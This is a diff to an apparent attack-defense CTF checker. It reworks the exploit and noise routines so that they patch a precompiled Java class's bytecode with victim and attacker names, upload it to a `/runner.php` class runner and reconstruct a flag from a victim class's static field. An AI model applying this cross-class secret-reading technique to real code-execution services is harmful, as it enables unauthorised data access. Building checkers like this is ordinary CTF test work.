@@ -169,29 +169,18 @@ async def exploit_test(
     no_of_fields = info["no_ints"]
     victm_name = info["class_name"]
 
-    victim = ints_to_class(victm_name, [0] * no_of_fields, 0, "public")
+    explt_name = "E_" + gen_name()[:8]
 
-    explt_name = "EXPL_" + gen_name()
+    data = accessing_class
+    data = data.replace(b"G" * 10, explt_name.encode())
+    data = data.replace(b"V" * 10, victm_name.encode())
 
-    expltr = "class " + explt_name + " {\n"
-    expltr += "  public static void main(String[] args) {\n"
-    expltr += "    int result = " + victm_name + ".secret_length;\n"
-    expltr += "  }\n"
-    expltr += "}\n"
-
-    with open(f"{victm_name}.java", "w") as f:
-        f.write(victim)
-    with open(f"{explt_name}.java", "w") as f:
-        f.write(expltr)
-
-    subprocess.run(["javac", f"{explt_name}.java"], check=True)
+    with open(f"{explt_name}.class", "wb") as f:
+        f.write(data)
 
     files = {"fileToUpload": open(f"{explt_name}.class", "rb")}
     r = await client.post("/runner.php", files=files)
 
-    os.remove(f"{victm_name}.java")
-    os.remove(f"{victm_name}.class")
-    os.remove(f"{explt_name}.java")
     os.remove(f"{explt_name}.class")
 
     return reconstruct_flag(r.text)
@@ -240,29 +229,18 @@ async def getnoise_access_public(
     victm_name = info["class_name"]
     secret = info["secret"]
 
-    victim = ints_to_class(victm_name, [0] * no_of_fields, 0, "public")
+    explt_name = "N_" + gen_name()[:8]
 
-    explt_name = "NOISE_" + gen_name()
+    data = accessing_class
+    data = data.replace(b"G" * 10, explt_name.encode())
+    data = data.replace(b"V" * 10, victm_name.encode())
 
-    expltr = "class " + explt_name + " {\n"
-    expltr += "  public static void main(String[] args) {\n"
-    expltr += "    int result = " + victm_name + ".secret_length;\n"
-    expltr += "  }\n"
-    expltr += "}\n"
-
-    with open(f"{victm_name}.java", "w") as f:
-        f.write(victim)
-    with open(f"{explt_name}.java", "w") as f:
-        f.write(expltr)
-
-    subprocess.run(["javac", f"{explt_name}.java"], check=True)
+    with open(f"{explt_name}.class", "wb") as f:
+        f.write(data)
 
     files = {"fileToUpload": open(f"{explt_name}.class", "rb")}
     r = await client.post("/runner.php", files=files)
 
-    os.remove(f"{victm_name}.java")
-    os.remove(f"{victm_name}.class")
-    os.remove(f"{explt_name}.java")
     os.remove(f"{explt_name}.class")
 
     assert_equals(reconstruct_flag(r.text), secret, "noise not found")
@@ -297,3 +275,24 @@ with open(f"{class_name}.class", "rb") as f:
 # subprocess.run(["java", name], check=True)
 #
 # exit(0)
+
+vtm_class = "class " + "V" * NAME_LENGTH + "{\n"
+vtm_class += "  static int secret_length;\n"
+vtm_class += "}\n"
+
+acc_class = "class " + "G" * NAME_LENGTH + "{\n"
+acc_class += "  public static void main(String[] args) {\n"
+acc_class += "    int result = " + "V" * NAME_LENGTH + ".secret_length;\n"
+acc_class += "  }\n"
+acc_class += "}\n"
+
+with open(f"VVVVVVVVVV.java", "w") as f:
+    f.write(vtm_class)
+
+with open(f"FooFoo.java", "w") as f:
+    f.write(acc_class)
+
+subprocess.run(["javac", "FooFoo.java"], check=True)
+
+with open(f"{'G' * 10}.class", "rb") as f:
+    accessing_class = f.read()
